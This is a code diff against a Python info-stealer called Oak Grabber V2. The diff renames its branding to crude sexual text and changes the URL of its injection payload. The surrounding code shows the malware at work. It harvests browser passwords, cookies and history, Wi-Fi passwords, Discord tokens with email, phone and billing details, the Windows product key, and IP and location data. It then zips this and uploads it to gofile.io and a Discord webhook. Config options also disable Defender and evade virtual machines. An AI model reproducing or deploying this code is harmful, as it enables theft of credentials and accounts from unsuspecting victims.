@@ -37,7 +37,7 @@ config = {
     'Hide_Console': True,
     'Disable_defender': True,
     'inject': True,
-    'injection_url': 'https://raw.githubusercontent.com/dreamyoak/Oak-injection/main/Oak.js',
+    'injection_url': 'https://raw.githubusercontent.com/ohioguy123/boob/main/oakv2.py',
     'Black_Screen': True,
     'Fake_error_message': True,
     'Antivm': True,
@@ -265,13 +265,13 @@ class oakgrabberV2(functions):
             self.exceptions.append(traceback.format_exc())
 
     def browserinfo(self, platform, path):
-        p_header = f"Oak Grabber V2 Passwords\nBrowser:{platform}\n\n"
-        c_header = f"Oak Grabber V2 Cookies\nBrowser:{platform}\n\n\n"
-        h_header = f"Oak Grabber V2 History\nBrowser:{platform}\n\n"
-        m_header = f"Oak Grabber V2 Other Info\nBrowser:{platform}\n\n"
-        b_header = f"Oak Grabber V2 Bookmarks\nBrowser:{platform}\n\n"
-        e_header = f"Oak Grabber V2 Extensions\nBrowser:{platform}\n\n"
-        d_header = f"Oak Grabber V2 Download History\nBrowser:{platform}\n\n"
+        p_header = f"BOOBS DICK Passwords\nBrowser:{platform}\n\n"
+        c_header = f"BOOBS DICK Cookies\nBrowser:{platform}\n\n\n"
+        h_header = f"BOOBS DICK History\nBrowser:{platform}\n\n"
+        m_header = f"BOOBS DICK Other Info\nBrowser:{platform}\n\n"
+        b_header = f"BOOBS DICK Bookmarks\nBrowser:{platform}\n\n"
+        e_header = f"BOOBS DICK Extensions\nBrowser:{platform}\n\n"
+        d_header = f"BOOBS DICK Download History\nBrowser:{platform}\n\n"
         if os.path.exists(path):
             self.passwords_temp = self.cookies_temp = self.history_temp = self.misc_temp = self.cookies_temp = self.down_temp = self.bookmarks_temp = self.ext_temp = ''
             def fname(x): return f'\\{platform} Info ({x}).txt'
@@ -936,7 +936,7 @@ class oakgrabberV2(functions):
             except IndexError:
                 t += ("{:<30}| {:<}]\n".format(i, ""))
             with open(self.dir+"\\Wifi passwords.txt","w") as f:
-                f.write(f"Oak Grabber V2 wifi passwords\n\nWi-Fi Name                    | Password\n------------------------------------------\n")
+                f.write(f"BOOBS DICK wifi passwords\n\nWi-Fi Name                    | Password\n------------------------------------------\n")
             with open(self.dir+"\\Wifi passwords.txt", 'a') as f:
                 f.write(f"{t}")
 
@@ -948,7 +948,7 @@ class oakgrabberV2(functions):
                     if line.startswith("Data="):
                         with open(os.path.join(self.dir, "Epic games data.txt"), 'w', encoding="cp437") as g:
                             g.write(
-                                f"Oak grabber V2 Epic Games Offline Data\n\n")
+                                f"BOOBS DICK Epic Games Offline Data\n\n")
                             g.write(line.split('Data=')[1].strip())
         else:
             pass
@@ -1087,7 +1087,7 @@ class oakgrabberV2(functions):
                                     f'Default Payment Method': x['default']
                                 }
                         billing_info.append(data)
-                        info += f"""\nOak grabber V2 Discordinfo\n\nBasic Information\nUsername: {user_name}\nAvatar id: {avatar_id}\nUser ID: {user_id}\nCreation Date: {creation_date}\nAvatar URL: {avatar_url if avatar_id else ""}\nToken: {token}\n\nNitro: {has_nitro}\n"""
+                        info += f"""\nBOOBS DICK Discordinfo\n\nBasic Information\nUsername: {user_name}\nAvatar id: {avatar_id}\nUser ID: {user_id}\nCreation Date: {creation_date}\nAvatar URL: {avatar_url if avatar_id else ""}\nToken: {token}\n\nNitro: {has_nitro}\n"""
                         if has_nitro:
                             info += (f"Expires in: {days_left} day(s)\n")
                         else:
@@ -1159,14 +1159,14 @@ class oakgrabberV2(functions):
                             info += ("No discord backup codes found")
                             wfa = ("No discord backup codes found")
                         embed = {
-                            "username": f"Dc Info | Oak Grabber V2",
-                            "avatar_url": "https://i.imgur.com/bbWgtHI.png",
+                            "username": f"Dc Info | BOOBS DICK",
+                            "avatar_url": "",
                             "embeds": [
                                 {
                                     "author": {
-                                        "name": "Wise Oak Tree for life 😎",
-                                        "url": "https://github.com/j0taro/Oak-token-Grabber",
-                                        "icon_url": "https://i.imgur.com/bbWgtHI.png"
+                                        "name": "pornhub is good for you",
+                                        "url": "",
+                                        "icon_url": ""
                                     },
                                     "description": f"""**__Tokens__**```{token}\n\n{tokens}```__**Discord Info**__```Username: {user_name}\nUser ID: {user_id}\nToken: {token}\nNitro: {has_nitro}\nPhone Number: {phone_number}\nEmail: {email}\n2FA/MFA Enabled: {mfa_enabled}\n{wfa}```""",
                                     "color": 0x000000,
@@ -1175,8 +1175,8 @@ class oakgrabberV2(functions):
                                         "url": f"{avatar_url}"
                                     },
                                     "footer": {
-                                        "text": "Oak grabber V2",
-                                        "icon_url": "https://i.imgur.com/dEiUxyB.png"
+                                        "text": "BOOBS DICK",
+                                        "icon_url": ""
                                     },
                                 }
                             ]
@@ -1296,7 +1296,7 @@ class oakgrabberV2(functions):
             self.exceptions.append(traceback.format_exc())
         name = os.getlogin()
         pc_username = os.getenv("COMPUTERNAME")
-        sysinfo = f'''Oak grabber V2 System Info\n\n\nHWID: {hardwareid}\nRAM: {ram}GB\nArchitecture: {ee} bit\nUsername: {pc_username}\nDisk: {disk}\nPlatform: {platform}\nPC-Name: {name}\nWindows key: {windowskey}\nCPU: {cpu}\nGPU: {gpu}\nRefresh rate: {rr}\nModel name: {mn}\nBuild manufacturer: {bm}\nBattery: {battery}\nResolution: {size}\nPath: {path}\n\n\nAntivirus: \n{av}\n\n\nInstalled apps: \n{installedapps}\n\n\nProcesses running\n{ps}'''
+        sysinfo = f'''BOOBS DICK System Info\n\n\nHWID: {hardwareid}\nRAM: {ram}GB\nArchitecture: {ee} bit\nUsername: {pc_username}\nDisk: {disk}\nPlatform: {platform}\nPC-Name: {name}\nWindows key: {windowskey}\nCPU: {cpu}\nGPU: {gpu}\nRefresh rate: {rr}\nModel name: {mn}\nBuild manufacturer: {bm}\nBattery: {battery}\nResolution: {size}\nPath: {path}\n\n\nAntivirus: \n{av}\n\n\nInstalled apps: \n{installedapps}\n\n\nProcesses running\n{ps}'''
         with open(f"{self.dir}\\System info.txt", 'w') as fp:
             fp.write(str(sysinfo))
         try:
@@ -1316,22 +1316,22 @@ class oakgrabberV2(functions):
         except Exception:
             self.exceptions.append(traceback.format_exc())
         embed = {
-            "username": f"System Info | Oak Grabber V2",
-            "avatar_url": "https://i.imgur.com/bbWgtHI.png",
-            "title": "__Oak Grabber V2 System Info__",
+            "username": f"System Info | BOOBS DICK",
+            "avatar_url": "",
+            "title": "__BOOBS DICK System Info__",
             "embeds": [
                      {
                          "author": {
-                             "name": "Wise Oak Tree for life 😎",
-                             "url": "https://github.com/j0taro/Oak-token-Grabber",
-                             "icon_url": "https://i.imgur.com/bbWgtHI.png"
+                             "name": "pornhub is good for you | BOOBS DICK",
+                             "url": "",
+                             "icon_url": ""
                          },
                          "description": f"""__**System Info**__```HWID: {hardwareid}\nRAM: {ram}GB\nArchitecture: {ee}bit\nUsername: {pc_username}\nDisk: {disk}\nPlatform: {platform}\nBattery: {battery}\nPC-Name: {name}\nWindows key: {windowskey}\nCPU: {cpu}\nGPU: {gpu}\nRefresh rate: {rr}\nModel name: {mn}\nBuild manufacturer: {bm}\nResolution: {size}\nPath: {path}```__**Ip Info**__\n```IP: {ip}\nCity: {city}\nCountry: {country}\nRegion: {region}\nMAC Address: {mac}\nVPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]}```[Google Maps Location]({googlemap})""",
                          "color": 0x000000,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "footer": {
-                             "text": "Oak grabber V2",
-                             "icon_url": "https://i.imgur.com/dEiUxyB.png"
+                             "text": "BOOBS DICK",
+                             "icon_url": ""
                          },
                      }
             ]
@@ -1340,12 +1340,12 @@ class oakgrabberV2(functions):
 
     def upload(self):
         name = os.getlogin()
-        _zipfile = os.path.join(self.dir, f'OakGrabberV2-{os.getlogin()}.zip')
+        _zipfile = os.path.join(self.dir, f'BOOBS DICK-{os.getlogin()}.zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
             for filename in files:
-                if filename == f'OakGrabberV2-{os.getlogin()}.zip':
+                if filename == f'BOOBS DICK-{os.getlogin()}.zip':
                     continue
                 absname = os.path.abspath(os.path.join(dirname, filename))
                 arcname = absname[len(abs_src) + 1:]
@@ -1359,30 +1359,30 @@ class oakgrabberV2(functions):
         else:
             content = ""
         embed = {
-            "username": f"{name} | Oak Grabber V2",
+            "username": f"{name} | BOOBS DICK",
             "content": content,
-            "avatar_url": "https://i.imgur.com/bbWgtHI.png",
-            "title": "__Oak Grabber V2__",
+            "avatar_url": "",
+            "title": "__BOOBS DICK__",
             "embeds": [
                      {
                          "author": {
-                             "name": "Wise Oak Tree for life 😎",
-                             "url": "https://github.com/j0taro/Oak-token-Grabber",
-                             "icon_url": "https://i.imgur.com/bbWgtHI.png"
+                             "name": "pornhub is good for you",
+                             "url": "",
+                             "icon_url": ""
                          },
                          "description": description,
                          "color": 0x000000,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "footer": {
-                             "text": "Oak grabber V2",
-                             "icon_url": "https://i.imgur.com/dEiUxyB.png"
+                             "text": "BOOBS DICK",
+                             "icon_url": ""
                         }
                     }
             ]
         }
         file = {
-            "username": f"{name} | Oak Grabber V2",
-            "avatar_url": "https://i.imgur.com/bbWgtHI.png"
+            "username": f"{name} | BOOBS DICK2",
+            "avatar_url": ""
         }
         if int(len(description)) <= 4096:
             with open(_zipfile, 'rb') as f:
@@ -1406,9 +1406,9 @@ class oakgrabberV2(functions):
                 f = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={
                                   'file': open(_zipfile, 'rb')}).json()["data"]["downloadPage"]
                 embed = {
-                    "username": f"{name} | Oak Grabber V2",
-                    "avatar_url": "https://i.imgur.com/bbWgtHI.png",
-                    "title": "__Oak Grabber V2__",
+                    "username": f"{name} | BOOBS DICK",
+                    "avatar_url": "",
+                    "title": "__boobs grabber__",
                     "content": content+f" {f}",
                 }
                 requests.post(self.webhook, json=embed)
